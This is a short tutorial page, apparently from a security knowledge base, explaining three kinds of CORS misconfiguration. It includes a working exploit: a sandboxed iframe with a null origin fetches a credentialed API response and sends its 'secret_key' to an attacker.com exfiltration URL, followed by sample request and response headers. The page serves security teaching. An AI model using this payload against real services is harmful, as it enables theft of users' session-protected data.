---
title: CORS Misconfiguration 
description: Introduction to CORS Misconfiguration vulnerabilites.
---

# CORS Misconfiguration

1. `Access-Control-Allow-Origin: *` : Allow everyone to fetch this ressource, it can be dangerous if the ressource is not intended to be public.
2. The `Access-Control-Allow-Origin` response header reflect the `Origin` request header : Same as `1.`, there are no protections.
3. `Access-Control-Allow-Origin` is `null` if the `Origin` is `null` : It can be exploited using sandboxed elements that set the `Origin` header to `null` by default.

Example of exploit :

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://api.cors-null-vulnerable.com/sensitiveContent', {
    credentials: 'include'
})
.then(response => response.json())
.then(j => document.location=`https://attacker.com/exfiltration?key=${j['secret_key']}`);
</script>
"></iframe> 
```

HTTP Request headers :

```
GET /sensitiveContent HTTP/1.1
Host: api.cors-null-vulnerable.com
Cookie: session=agurne3nriezwaejpanrghq
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: null
[...]
```

HTTP response :

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "secret_key": "12345",
}
```